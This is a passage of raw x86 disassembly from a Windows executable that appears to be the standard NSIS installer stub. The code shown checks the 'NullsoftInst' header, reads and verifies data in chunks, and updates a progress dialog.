  40347e:	00 fe                	add    %bh,%dh
  403480:	28 40 00             	sub    %al,0x0(%eax)
  403483:	58                   	pop    %eax
  403484:	29 40 00             	sub    %eax,0x0(%eax)
  403487:	df 29                	fildll (%ecx)
  403489:	40                   	inc    %eax
  40348a:	00 ad 2b 40 00 3b    	add    %ch,0x3b00402b(%ebp)
  403490:	2c 40                	sub    $0x40,%al
  403492:	00 a4 2c 40 00 be 2c 	add    %ah,0x2cbe0040(%esp,%ebp,1)
  403499:	40                   	inc    %eax
  40349a:	00 e6                	add    %ah,%dh
  40349c:	2c 40                	sub    $0x40,%al
  40349e:	00 a4 2d 40 00 90 2f 	add    %ah,0x2f900040(%ebp,%ebp,1)
  4034a5:	40                   	inc    %eax
  4034a6:	00 c5                	add    %al,%ch
  4034a8:	2f                   	das
  4034a9:	40                   	inc    %eax
  4034aa:	00 df                	add    %bl,%bh
  4034ac:	2f                   	das
  4034ad:	40                   	inc    %eax
  4034ae:	00 06                	add    %al,(%esi)
  4034b0:	30 40 00             	xor    %al,0x0(%eax)
  4034b3:	45                   	inc    %ebp
  4034b4:	30 40 00             	xor    %al,0x0(%eax)
  4034b7:	8d 31                	lea    (%ecx),%esi
  4034b9:	40                   	inc    %eax
  4034ba:	00 e1                	add    %ah,%cl
  4034bc:	31 40 00             	xor    %eax,0x0(%eax)
  4034bf:	6d                   	insl   (%dx),%es:(%edi)
  4034c0:	32 40 00             	xor    0x0(%eax),%al
  4034c3:	d5 32                	aad    $0x32
  4034c5:	40                   	inc    %eax
  4034c6:	00 a8 33 40 00 84    	add    %ch,-0x7bffbfcd(%eax)
  4034cc:	33 40 00             	xor    0x0(%eax),%eax
  4034cf:	e6 2c                	out    %al,$0x2c
  4034d1:	40                   	inc    %eax
  4034d2:	00 a4 2d 40 00 7c 1e 	add    %ah,0x1e7c0040(%ebp,%ebp,1)
  4034d9:	40                   	inc    %eax
  4034da:	00 80 1e 40 00 84    	add    %al,-0x7bffbfe2(%eax)
  4034e0:	1e                   	push   %ds
  4034e1:	40                   	inc    %eax
  4034e2:	00 89 1e 40 00 a5    	add    %cl,-0x5affbfe2(%ecx)
  4034e8:	1e                   	push   %ds
  4034e9:	40                   	inc    %eax
  4034ea:	00 a9 1e 40 00 ad    	add    %ch,-0x52ffbfe2(%ecx)
  4034f0:	1e                   	push   %ds
  4034f1:	40                   	inc    %eax
  4034f2:	00 b1 1e 40 00 bc    	add    %dh,-0x43ffbfe2(%ecx)
  4034f8:	1e                   	push   %ds
  4034f9:	40                   	inc    %eax
  4034fa:	00 c9                	add    %cl,%cl
  4034fc:	1e                   	push   %ds
  4034fd:	40                   	inc    %eax
  4034fe:	00 d1                	add    %dl,%cl
  403500:	1e                   	push   %ds
  403501:	40                   	inc    %eax
  403502:	00 de                	add    %bl,%dh
  403504:	1e                   	push   %ds
  403505:	40                   	inc    %eax
  403506:	00 e2                	add    %ah,%dl
  403508:	1e                   	push   %ds
  403509:	40                   	inc    %eax
  40350a:	00 e6                	add    %ah,%dh
  40350c:	1e                   	push   %ds
  40350d:	40                   	inc    %eax
  40350e:	00 8b 4c 24 04 a1    	add    %cl,-0x5efbdbb4(%ebx)
  403514:	04 c1                	add    $0xc1,%al
  403516:	40                   	inc    %eax
  403517:	00 56 ff             	add    %dl,-0x1(%esi)
  40351a:	34 88                	xor    $0x88,%al
  40351c:	6a 00                	push   $0x0
  40351e:	e8 6e 2f 00 00       	call   0x406491
  403523:	8b f0                	mov    %eax,%esi
  403525:	56                   	push   %esi
  403526:	e8 90 3f 00 00       	call   0x4074bb
  40352b:	0f b7 16             	movzwl (%esi),%edx
  40352e:	5e                   	pop    %esi
  40352f:	c3                   	ret
  403530:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403534:	85 c9                	test   %ecx,%ecx
  403536:	79 04                	jns    0x40353c
  403538:	8b c1                	mov    %ecx,%eax
  40353a:	eb 0c                	jmp    0x403548
  40353c:	a1 e4 e2 47 00       	mov    0x47e2e4,%eax
  403541:	05 01 00 00 80       	add    $0x80000001,%eax
  403546:	03 c1                	add    %ecx,%eax
  403548:	c2 04 00             	ret    $0x4
  40354b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40354f:	8b 0d 04 c1 40 00    	mov    0x40c104,%ecx
  403555:	99                   	cltd
  403556:	33 c2                	xor    %edx,%eax
  403558:	2b c2                	sub    %edx,%eax
  40355a:	8b d0                	mov    %eax,%edx
  40355c:	c1 f8 04             	sar    $0x4,%eax
  40355f:	83 e2 0f             	and    $0xf,%edx
  403562:	c1 e0 0e             	shl    $0xe,%eax
  403565:	56                   	push   %esi
  403566:	05 08 c1 40 00       	add    $0x40c108,%eax
  40356b:	ff 34 91             	push   (%ecx,%edx,4)
  40356e:	50                   	push   %eax
  40356f:	e8 1d 2f 00 00       	call   0x406491
  403574:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  403579:	8b f0                	mov    %eax,%esi
  40357b:	7d 06                	jge    0x403583
  40357d:	56                   	push   %esi
  40357e:	e8 50 40 00 00       	call   0x4075d3
  403583:	8b c6                	mov    %esi,%eax
  403585:	5e                   	pop    %esi
  403586:	c2 04 00             	ret    $0x4
  403589:	55                   	push   %ebp
  40358a:	8b ec                	mov    %esp,%ebp
  40358c:	56                   	push   %esi
  40358d:	8b 75 0c             	mov    0xc(%ebp),%esi
  403590:	66 83 3e 00          	cmpw   $0x0,(%esi)
  403594:	75 07                	jne    0x40359d
  403596:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  40359b:	eb 2c                	jmp    0x4035c9
  40359d:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  4035a4:	8d 45 10             	lea    0x10(%ebp),%eax
  4035a7:	50                   	push   %eax
  4035a8:	ff 75 08             	push   0x8(%ebp)
  4035ab:	e8 80 ff ff ff       	call   0x403530
  4035b0:	50                   	push   %eax
  4035b1:	e8 40 31 00 00       	call   0x4066f6
  4035b6:	85 c0                	test   %eax,%eax
  4035b8:	74 0c                	je     0x4035c6
  4035ba:	ff 75 10             	push   0x10(%ebp)
  4035bd:	56                   	push   %esi
  4035be:	50                   	push   %eax
  4035bf:	e8 5a de ff ff       	call   0x40141e
  4035c4:	eb 03                	jmp    0x4035c9
  4035c6:	6a 06                	push   $0x6
  4035c8:	58                   	pop    %eax
  4035c9:	5e                   	pop    %esi
  4035ca:	5d                   	pop    %ebp
  4035cb:	c2 0c 00             	ret    $0xc
  4035ce:	55                   	push   %ebp
  4035cf:	8b ec                	mov    %esp,%ebp
  4035d1:	51                   	push   %ecx
  4035d2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4035d5:	50                   	push   %eax
  4035d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4035d9:	0d 20 00 10 00       	or     $0x100020,%eax
  4035de:	50                   	push   %eax
  4035df:	6a 22                	push   $0x22
  4035e1:	e8 65 ff ff ff       	call   0x40354b
  4035e6:	50                   	push   %eax
  4035e7:	a1 04 c1 40 00       	mov    0x40c104,%eax
  4035ec:	ff 70 04             	push   0x4(%eax)
  4035ef:	e8 3c ff ff ff       	call   0x403530
  4035f4:	50                   	push   %eax
  4035f5:	e8 b4 32 00 00       	call   0x4068ae
  4035fa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4035fd:	33 d2                	xor    %edx,%edx
  4035ff:	85 c0                	test   %eax,%eax
  403601:	0f 45 ca             	cmovne %edx,%ecx
  403604:	8b c1                	mov    %ecx,%eax
  403606:	c9                   	leave
  403607:	c2 04 00             	ret    $0x4
  40360a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40360e:	85 c0                	test   %eax,%eax
  403610:	79 13                	jns    0x403625
  403612:	8d 48 01             	lea    0x1(%eax),%ecx
  403615:	b8 00 f0 47 00       	mov    $0x47f000,%eax
  40361a:	c1 e1 0e             	shl    $0xe,%ecx
  40361d:	2b c1                	sub    %ecx,%eax
  40361f:	50                   	push   %eax
  403620:	e8 96 3e 00 00       	call   0x4074bb
  403625:	c2 04 00             	ret    $0x4
  403628:	ff 74 24 08          	push   0x8(%esp)
  40362c:	ff 74 24 08          	push   0x8(%esp)
  403630:	ff 35 10 c0 40 00    	push   0x40c010
  403636:	e8 a3 3b 00 00       	call   0x4071de
  40363b:	c2 08 00             	ret    $0x8
  40363e:	6a 00                	push   $0x0
  403640:	6a 00                	push   $0x0
  403642:	ff 74 24 0c          	push   0xc(%esp)
  403646:	ff 35 10 c0 40 00    	push   0x40c010
  40364c:	ff 15 18 91 40 00    	call   *0x409118
  403652:	c2 04 00             	ret    $0x4
  403655:	81 ec 9c 00 00 00    	sub    $0x9c,%esp
  40365b:	8b 8c 24 a0 00 00 00 	mov    0xa0(%esp),%ecx
  403662:	b8 38 5d 43 00       	mov    $0x435d38,%eax
  403667:	53                   	push   %ebx
  403668:	55                   	push   %ebp
  403669:	56                   	push   %esi
  40366a:	57                   	push   %edi
  40366b:	8b bc 24 b8 00 00 00 	mov    0xb8(%esp),%edi
  403672:	bb 00 80 00 00       	mov    $0x8000,%ebx
  403677:	85 ff                	test   %edi,%edi
  403679:	0f 45 9c 24 bc 00 00 	cmovne 0xbc(%esp),%ebx
  403680:	00 
  403681:	33 f6                	xor    %esi,%esi
  403683:	85 ff                	test   %edi,%edi
  403685:	0f 45 c7             	cmovne %edi,%eax
  403688:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40368c:	85 c9                	test   %ecx,%ecx
  40368e:	78 0d                	js     0x40369d
  403690:	a1 78 e2 47 00       	mov    0x47e278,%eax
  403695:	03 c1                	add    %ecx,%eax
  403697:	50                   	push   %eax
  403698:	e8 a1 ff ff ff       	call   0x40363e
  40369d:	6a 04                	push   $0x4
  40369f:	8d 44 24 14          	lea    0x14(%esp),%eax
  4036a3:	50                   	push   %eax
  4036a4:	ff 35 10 c0 40 00    	push   0x40c010
  4036aa:	e8 2f 3b 00 00       	call   0x4071de
  4036af:	85 c0                	test   %eax,%eax
  4036b1:	0f 84 cf 01 00 00    	je     0x403886
  4036b7:	8b 44 24 10          	mov    0x10(%esp),%eax
  4036bb:	85 c0                	test   %eax,%eax
  4036bd:	0f 89 65 01 00 00    	jns    0x403828
  4036c3:	ff 15 cc 90 40 00    	call   *0x4090cc
  4036c9:	21 35 a4 06 42 00    	and    %esi,0x4206a4
  4036cf:	21 35 a0 06 42 00    	and    %esi,0x4206a0
  4036d5:	89 44 24 14          	mov    %eax,0x14(%esp)
  4036d9:	b8 28 1d 42 00       	mov    $0x421d28,%eax
  4036de:	a3 30 9d 42 00       	mov    %eax,0x429d30
  4036e3:	a3 2c 9d 42 00       	mov    %eax,0x429d2c
  4036e8:	8b 44 24 10          	mov    0x10(%esp),%eax
  4036ec:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  4036f1:	c7 05 88 01 42 00 08 	movl   $0x8,0x420188
  4036f8:	00 00 00 
  4036fb:	8b c8                	mov    %eax,%ecx
  4036fd:	c7 05 28 9d 42 00 28 	movl   $0x429d28,0x429d28
  403704:	9d 42 00 
  403707:	89 44 24 20          	mov    %eax,0x20(%esp)
  40370b:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40370f:	0f 86 0b 01 00 00    	jbe    0x403820
  403715:	bd 00 40 00 00       	mov    $0x4000,%ebp
  40371a:	3b cd                	cmp    %ebp,%ecx
  40371c:	0f 4c e9             	cmovl  %ecx,%ebp
  40371f:	55                   	push   %ebp
  403720:	68 38 1d 43 00       	push   $0x431d38
  403725:	e8 fe fe ff ff       	call   0x403628
  40372a:	85 c0                	test   %eax,%eax
  40372c:	0f 84 54 01 00 00    	je     0x403886
  403732:	29 6c 24 10          	sub    %ebp,0x10(%esp)
  403736:	89 2d 7c 01 42 00    	mov    %ebp,0x42017c
  40373c:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  403740:	c7 05 78 01 42 00 38 	movl   $0x431d38,0x420178
  403747:	1d 43 00 
  40374a:	68 78 01 42 00       	push   $0x420178
  40374f:	89 2d 80 01 42 00    	mov    %ebp,0x420180
  403755:	89 1d 84 01 42 00    	mov    %ebx,0x420184
  40375b:	e8 bc 43 00 00       	call   0x407b1c
  403760:	89 44 24 28          	mov    %eax,0x28(%esp)
  403764:	85 c0                	test   %eax,%eax
  403766:	0f 88 b8 00 00 00    	js     0x403824
  40376c:	a1 80 01 42 00       	mov    0x420180,%eax
  403771:	2b c5                	sub    %ebp,%eax
  403773:	89 44 24 18          	mov    %eax,0x18(%esp)
  403777:	ff 15 cc 90 40 00    	call   *0x4090cc
  40377d:	f6 05 14 e3 47 00 01 	testb  $0x1,0x47e314
  403784:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403788:	89 44 24 24          	mov    %eax,0x24(%esp)
  40378c:	74 4b                	je     0x4037d9
  40378e:	2b 44 24 14          	sub    0x14(%esp),%eax
  403792:	3d c8 00 00 00       	cmp    $0xc8,%eax
  403797:	77 04                	ja     0x40379d
  403799:	85 c9                	test   %ecx,%ecx
  40379b:	75 3c                	jne    0x4037d9
  40379d:	8b 44 24 20          	mov    0x20(%esp),%eax
  4037a1:	50                   	push   %eax
  4037a2:	6a 64                	push   $0x64
  4037a4:	2b c1                	sub    %ecx,%eax
  4037a6:	50                   	push   %eax
  4037a7:	ff 15 f0 90 40 00    	call   *0x4090f0
  4037ad:	50                   	push   %eax
  4037ae:	8d 44 24 30          	lea    0x30(%esp),%eax
  4037b2:	68 c8 a1 40 00       	push   $0x40a1c8
  4037b7:	50                   	push   %eax
  4037b8:	ff 15 68 92 40 00    	call   *0x409268
  4037be:	83 c4 0c             	add    $0xc,%esp
  4037c1:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4037c5:	50                   	push   %eax
  4037c6:	6a 00                	push   $0x0
  4037c8:	e8 44 2b 00 00       	call   0x406311
  4037cd:	8b 44 24 24          	mov    0x24(%esp),%eax
  4037d1:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4037d5:	89 44 24 14          	mov    %eax,0x14(%esp)
  4037d9:	8b 44 24 18          	mov    0x18(%esp),%eax
  4037dd:	85 c0                	test   %eax,%eax
  4037df:	74 37                	je     0x403818
  4037e1:	85 ff                	test   %edi,%edi
  4037e3:	75 18                	jne    0x4037fd
  4037e5:	50                   	push   %eax
  4037e6:	55                   	push   %ebp
  4037e7:	ff b4 24 bc 00 00 00 	push   0xbc(%esp)
  4037ee:	e8 ae 3a 00 00       	call   0x4072a1
  4037f3:	85 c0                	test   %eax,%eax
  4037f5:	74 74                	je     0x40386b
  4037f7:	8b 44 24 18          	mov    0x18(%esp),%eax
  4037fb:	eb 0c                	jmp    0x403809
  4037fd:	8b 2d 80 01 42 00    	mov    0x420180,%ebp
  403803:	2b d8                	sub    %eax,%ebx
  403805:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  403809:	03 f0                	add    %eax,%esi
  40380b:	83 7c 24 28 01       	cmpl   $0x1,0x28(%esp)
  403810:	0f 85 34 ff ff ff    	jne    0x40374a
  403816:	eb 08                	jmp    0x403820
  403818:	85 c9                	test   %ecx,%ecx
  40381a:	0f 8f f5 fe ff ff    	jg     0x403715
  403820:	8b c6                	mov    %esi,%eax
  403822:	eb 65                	jmp    0x403889
  403824:	6a fc                	push   $0xfffffffc
  403826:	eb 60                	jmp    0x403888
  403828:	85 ff                	test   %edi,%edi
  40382a:	75 43                	jne    0x40386f
  40382c:	85 c0                	test   %eax,%eax
  40382e:	7e f0                	jle    0x403820
  403830:	bd 38 1d 43 00       	mov    $0x431d38,%ebp
  403835:	3b c3                	cmp    %ebx,%eax
  403837:	8b fb                	mov    %ebx,%edi
  403839:	0f 4c f8             	cmovl  %eax,%edi
  40383c:	57                   	push   %edi
  40383d:	55                   	push   %ebp
  40383e:	e8 e5 fd ff ff       	call   0x403628
  403843:	85 c0                	test   %eax,%eax
  403845:	74 3f                	je     0x403886
  403847:	57                   	push   %edi
  403848:	55                   	push   %ebp
  403849:	ff b4 24 bc 00 00 00 	push   0xbc(%esp)
  403850:	e8 4c 3a 00 00       	call   0x4072a1
  403855:	85 c0                	test   %eax,%eax
  403857:	74 12                	je     0x40386b
  403859:	8b 44 24 10          	mov    0x10(%esp),%eax
  40385d:	03 f7                	add    %edi,%esi
  40385f:	2b c7                	sub    %edi,%eax
  403861:	89 44 24 10          	mov    %eax,0x10(%esp)
  403865:	85 c0                	test   %eax,%eax
  403867:	7f cc                	jg     0x403835
  403869:	eb b5                	jmp    0x403820
  40386b:	6a fe                	push   $0xfffffffe
  40386d:	eb 19                	jmp    0x403888
  40386f:	8b b4 24 bc 00 00 00 	mov    0xbc(%esp),%esi
  403876:	3b c6                	cmp    %esi,%eax
  403878:	0f 4c f0             	cmovl  %eax,%esi
  40387b:	56                   	push   %esi
  40387c:	57                   	push   %edi
  40387d:	e8 a6 fd ff ff       	call   0x403628
  403882:	85 c0                	test   %eax,%eax
  403884:	75 9a                	jne    0x403820
  403886:	6a fd                	push   $0xfffffffd
  403888:	58                   	pop    %eax
  403889:	5f                   	pop    %edi
  40388a:	5e                   	pop    %esi
  40388b:	5d                   	pop    %ebp
  40388c:	5b                   	pop    %ebx
  40388d:	81 c4 9c 00 00 00    	add    $0x9c,%esp
  403893:	c2 10 00             	ret    $0x10
  403896:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40389b:	74 18                	je     0x4038b5
  40389d:	a1 70 01 42 00       	mov    0x420170,%eax
  4038a2:	85 c0                	test   %eax,%eax
  4038a4:	74 07                	je     0x4038ad
  4038a6:	50                   	push   %eax
  4038a7:	ff 15 2c 92 40 00    	call   *0x40922c
  4038ad:	83 25 70 01 42 00 00 	andl   $0x0,0x420170
  4038b4:	c3                   	ret
  4038b5:	83 3d 70 01 42 00 00 	cmpl   $0x0,0x420170
  4038bc:	74 08                	je     0x4038c6
  4038be:	6a 00                	push   $0x0
  4038c0:	e8 20 2f 00 00       	call   0x4067e5
  4038c5:	c3                   	ret
  4038c6:	ff 15 cc 90 40 00    	call   *0x4090cc
  4038cc:	3b 05 20 e2 47 00    	cmp    0x47e220,%eax
  4038d2:	76 25                	jbe    0x4038f9
  4038d4:	6a 00                	push   $0x0
  4038d6:	68 5c 3b 40 00       	push   $0x403b5c
  4038db:	6a 00                	push   $0x0
  4038dd:	6a 6f                	push   $0x6f
  4038df:	ff 35 14 62 47 00    	push   0x476214
  4038e5:	ff 15 28 92 40 00    	call   *0x409228
  4038eb:	6a 05                	push   $0x5
  4038ed:	50                   	push   %eax
  4038ee:	a3 70 01 42 00       	mov    %eax,0x420170
  4038f3:	ff 15 54 92 40 00    	call   *0x409254
  4038f9:	c3                   	ret
  4038fa:	83 ec 24             	sub    $0x24,%esp
  4038fd:	53                   	push   %ebx
  4038fe:	55                   	push   %ebp
  4038ff:	56                   	push   %esi
  403900:	57                   	push   %edi
  403901:	33 ff                	xor    %edi,%edi
  403903:	33 db                	xor    %ebx,%ebx
  403905:	89 7c 24 14          	mov    %edi,0x14(%esp)
  403909:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40390d:	ff 15 cc 90 40 00    	call   *0x4090cc
  403913:	68 00 20 00 00       	push   $0x2000
  403918:	be 00 b0 4e 00       	mov    $0x4eb000,%esi
  40391d:	05 e8 03 00 00       	add    $0x3e8,%eax
  403922:	56                   	push   %esi
  403923:	53                   	push   %ebx
  403924:	a3 20 e2 47 00       	mov    %eax,0x47e220
  403929:	ff 15 c8 90 40 00    	call   *0x4090c8
  40392f:	6a 03                	push   $0x3
  403931:	68 00 00 00 80       	push   $0x80000000
  403936:	56                   	push   %esi
  403937:	e8 75 38 00 00       	call   0x4071b1
  40393c:	8b e8                	mov    %eax,%ebp
  40393e:	89 2d 10 c0 40 00    	mov    %ebp,0x40c010
  403944:	83 fd ff             	cmp    $0xffffffff,%ebp
  403947:	75 0a                	jne    0x403953
  403949:	b8 f8 9f 40 00       	mov    $0x409ff8,%eax
  40394e:	e9 ff 01 00 00       	jmp    0x403b52
  403953:	56                   	push   %esi
  403954:	be 00 b0 4d 00       	mov    $0x4db000,%esi
  403959:	56                   	push   %esi
  40395a:	e8 51 3a 00 00       	call   0x4073b0
  40395f:	56                   	push   %esi
  403960:	e8 41 3c 00 00       	call   0x4075a6
  403965:	50                   	push   %eax
  403966:	68 00 f0 4e 00       	push   $0x4ef000
  40396b:	e8 40 3a 00 00       	call   0x4073b0
  403970:	6a 00                	push   $0x0
  403972:	55                   	push   %ebp
  403973:	ff 15 d0 90 40 00    	call   *0x4090d0
  403979:	8b f0                	mov    %eax,%esi
  40397b:	89 35 68 01 42 00    	mov    %esi,0x420168
  403981:	85 f6                	test   %esi,%esi
  403983:	0f 84 f6 00 00 00    	je     0x403a7f
  403989:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  40398d:	83 3d 28 e2 47 00 00 	cmpl   $0x0,0x47e228
  403994:	b8 00 80 00 00       	mov    $0x8000,%eax
  403999:	bf 00 02 00 00       	mov    $0x200,%edi
  40399e:	0f 45 f8             	cmovne %eax,%edi
  4039a1:	3b f7                	cmp    %edi,%esi
  4039a3:	0f 42 fe             	cmovb  %esi,%edi
  4039a6:	57                   	push   %edi
  4039a7:	68 38 9d 42 00       	push   $0x429d38
  4039ac:	e8 77 fc ff ff       	call   0x403628
  4039b1:	85 c0                	test   %eax,%eax
  4039b3:	0f 84 8c 01 00 00    	je     0x403b45
  4039b9:	83 3d 28 e2 47 00 00 	cmpl   $0x0,0x47e228
  4039c0:	75 7f                	jne    0x403a41
  4039c2:	6a 1c                	push   $0x1c
  4039c4:	68 38 9d 42 00       	push   $0x429d38
  4039c9:	8d 44 24 20          	lea    0x20(%esp),%eax
  4039cd:	50                   	push   %eax
  4039ce:	e8 1d 35 00 00       	call   0x406ef0
  4039d3:	f7 44 24 18 f0 ff ff 	testl  $0xfffffff0,0x18(%esp)
  4039da:	ff 
  4039db:	75 71                	jne    0x403a4e
  4039dd:	81 7c 24 1c ef be ad 	cmpl   $0xdeadbeef,0x1c(%esp)
  4039e4:	de 
  4039e5:	75 67                	jne    0x403a4e
  4039e7:	81 7c 24 28 49 6e 73 	cmpl   $0x74736e49,0x28(%esp)
  4039ee:	74 
  4039ef:	75 5d                	jne    0x403a4e
  4039f1:	81 7c 24 24 73 6f 66 	cmpl   $0x74666f73,0x24(%esp)
  4039f8:	74 
  4039f9:	75 53                	jne    0x403a4e
  4039fb:	81 7c 24 20 4e 75 6c 	cmpl   $0x6c6c754e,0x20(%esp)
  403a02:	6c 
  403a03:	75 49                	jne    0x403a4e
  403a05:	a1 6c 01 42 00       	mov    0x42016c,%eax
  403a0a:	0b 5c 24 18          	or     0x18(%esp),%ebx
  403a0e:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  403a12:	a3 28 e2 47 00       	mov    %eax,0x47e228
  403a17:	8b c3                	mov    %ebx,%eax
  403a19:	83 e0 02             	and    $0x2,%eax
  403a1c:	09 05 00 e3 47 00    	or     %eax,0x47e300
  403a22:	3b ce                	cmp    %esi,%ecx
  403a24:	0f 87 23 01 00 00    	ja     0x403b4d
  403a2a:	8b c3                	mov    %ebx,%eax
  403a2c:	24 0c                	and    $0xc,%al
  403a2e:	3c 04                	cmp    $0x4,%al
  403a30:	74 45                	je     0x403a77
  403a32:	ff 44 24 10          	incl   0x10(%esp)
  403a36:	8d 71 fc             	lea    -0x4(%ecx),%esi
  403a39:	3b fe                	cmp    %esi,%edi
  403a3b:	76 11                	jbe    0x403a4e
  403a3d:	8b fe                	mov    %esi,%edi
  403a3f:	eb 0d                	jmp    0x403a4e
  403a41:	f6 c3 02             	test   $0x2,%bl
  403a44:	75 08                	jne    0x403a4e
  403a46:	6a 00                	push   $0x0
  403a48:	e8 49 fe ff ff       	call   0x403896
  403a4d:	59                   	pop    %ecx
  403a4e:	3b 35 68 01 42 00    	cmp    0x420168,%esi
  403a54:	73 13                	jae    0x403a69
  403a56:	57                   	push   %edi
  403a57:	68 38 9d 42 00       	push   $0x429d38
  403a5c:	ff 74 24 1c          	push   0x1c(%esp)
  403a60:	e8 6b 3c 00 00       	call   0x4076d0
  403a65:	89 44 24 14          	mov    %eax,0x14(%esp)
  403a69:	01 3d 6c 01 42 00    	add    %edi,0x42016c
  403a6f:	2b f7                	sub    %edi,%esi
  403a71:	0f 85 16 ff ff ff    	jne    0x40398d
  403a77:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403a7b:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403a7f:	6a 01                	push   $0x1
  403a81:	e8 10 fe ff ff       	call   0x403896
  403a86:	83 3d 28 e2 47 00 00 	cmpl   $0x0,0x47e228
  403a8d:	59                   	pop    %ecx
  403a8e:	0f 84 b9 00 00 00    	je     0x403b4d
  403a94:	85 db                	test   %ebx,%ebx
  403a96:	74 2f                	je     0x403ac7
  403a98:	ff 35 6c 01 42 00    	push   0x42016c
  403a9e:	e8 9b fb ff ff       	call   0x40363e
  403aa3:	6a 04                	push   $0x4
  403aa5:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  403aa9:	50                   	push   %eax
  403aaa:	ff 35 10 c0 40 00    	push   0x40c010
  403ab0:	e8 29 37 00 00       	call   0x4071de
  403ab5:	85 c0                	test   %eax,%eax
  403ab7:	0f 84 90 00 00 00    	je     0x403b4d
  403abd:	3b 7c 24 38          	cmp    0x38(%esp),%edi
  403ac1:	0f 85 86 00 00 00    	jne    0x403b4d
  403ac7:	ff 74 24 2c          	push   0x2c(%esp)
  403acb:	6a 40                	push   $0x40
  403acd:	ff 15 f8 90 40 00    	call   *0x4090f8
  403ad3:	8b 0d 28 e2 47 00    	mov    0x47e228,%ecx
  403ad9:	8b f0                	mov    %eax,%esi
  403adb:	83 c1 1c             	add    $0x1c,%ecx
  403ade:	51                   	push   %ecx
  403adf:	e8 5a fb ff ff       	call   0x40363e
  403ae4:	ff 74 24 2c          	push   0x2c(%esp)
  403ae8:	33 db                	xor    %ebx,%ebx
  403aea:	56                   	push   %esi
  403aeb:	53                   	push   %ebx
  403aec:	6a ff                	push   $0xffffffff
  403aee:	e8 62 fb ff ff       	call   0x403655
  403af3:	3b 44 24 2c          	cmp    0x2c(%esp),%eax
  403af7:	75 54                	jne    0x403b4d
  403af9:	f6 44 24 18 01       	testb  $0x1,0x18(%esp)
  403afe:	89 35 30 e2 47 00    	mov    %esi,0x47e230
  403b04:	8b 06                	mov    (%esi),%eax
  403b06:	a3 2c e2 47 00       	mov    %eax,0x47e22c
  403b0b:	74 06                	je     0x403b13
  403b0d:	ff 05 24 e2 47 00    	incl   0x47e224
  403b13:	6a 08                	push   $0x8
  403b15:	59                   	pop    %ecx
  403b16:	8d 46 44             	lea    0x44(%esi),%eax
  403b19:	8d 40 f8             	lea    -0x8(%eax),%eax
  403b1c:	01 30                	add    %esi,(%eax)
  403b1e:	83 e9 01             	sub    $0x1,%ecx
  403b21:	75 f6                	jne    0x403b19
  403b23:	6a 01                	push   $0x1
  403b25:	53                   	push   %ebx
  403b26:	53                   	push   %ebx
  403b27:	55                   	push   %ebp
  403b28:	ff 15 18 91 40 00    	call   *0x409118
  403b2e:	89 46 3c             	mov    %eax,0x3c(%esi)
  403b31:	8d 46 04             	lea    0x4(%esi),%eax
  403b34:	6a 40                	push   $0x40
  403b36:	50                   	push   %eax
  403b37:	68 40 e2 47 00       	push   $0x47e240
  403b3c:	e8 af 33 00 00       	call   0x406ef0
  403b41:	33 c0                	xor    %eax,%eax
  403b43:	eb 0d                	jmp    0x403b52
  403b45:	6a 01                	push   $0x1
  403b47:	e8 4a fd ff ff       	call   0x403896
  403b4c:	59                   	pop    %ecx
  403b4d:	b8 30 a0 40 00       	mov    $0x40a030,%eax
  403b52:	5f                   	pop    %edi
  403b53:	5e                   	pop    %esi
  403b54:	5d                   	pop    %ebp
  403b55:	5b                   	pop    %ebx
  403b56:	83 c4 24             	add    $0x24,%esp
  403b59:	c2 04 00             	ret    $0x4
  403b5c:	55                   	push   %ebp
  403b5d:	8b ec                	mov    %esp,%ebp
  403b5f:	81 ec 80 00 00 00    	sub    $0x80,%esp
  403b65:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  403b6c:	75 14                	jne    0x403b82
  403b6e:	6a 00                	push   $0x0
  403b70:	68 fa 00 00 00       	push   $0xfa
  403b75:	6a 01                	push   $0x1
  403b77:	ff 75 08             	push   0x8(%ebp)
  403b7a:	ff 15 24 92 40 00    	call   *0x409224
  403b80:	eb 09                	jmp    0x403b8b
  403b82:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  403b89:	75 4e                	jne    0x403bd9
  403b8b:	8b 0d 68 01 42 00    	mov    0x420168,%ecx
  403b91:	39 0d 6c 01 42 00    	cmp    %ecx,0x42016c
  403b97:	51                   	push   %ecx
  403b98:	0f 42 0d 6c 01 42 00 	cmovb  0x42016c,%ecx
  403b9f:	6a 64                	push   $0x64
  403ba1:	51                   	push   %ecx
  403ba2:	ff 15 f0 90 40 00    	call   *0x4090f0
  403ba8:	50                   	push   %eax
  403ba9:	8d 45 80             	lea    -0x80(%ebp),%eax
  403bac:	68 c4 9f 40 00       	push   $0x409fc4
  403bb1:	50                   	push   %eax
  403bb2:	ff 15 68 92 40 00    	call   *0x409268
  403bb8:	83 c4 0c             	add    $0xc,%esp
  403bbb:	8d 45 80             	lea    -0x80(%ebp),%eax
  403bbe:	50                   	push   %eax
  403bbf:	ff 75 08             	push   0x8(%ebp)
  403bc2:	ff 15 20 92 40 00    	call   *0x409220
  403bc8:	8d 45 80             	lea    -0x80(%ebp),%eax
  403bcb:	50                   	push   %eax
  403bcc:	68 06 04 00 00       	push   $0x406
  403bd1:	ff 75 08             	push   0x8(%ebp)
  403bd4:	e8 cb 37 00 00       	call   0x4073a4
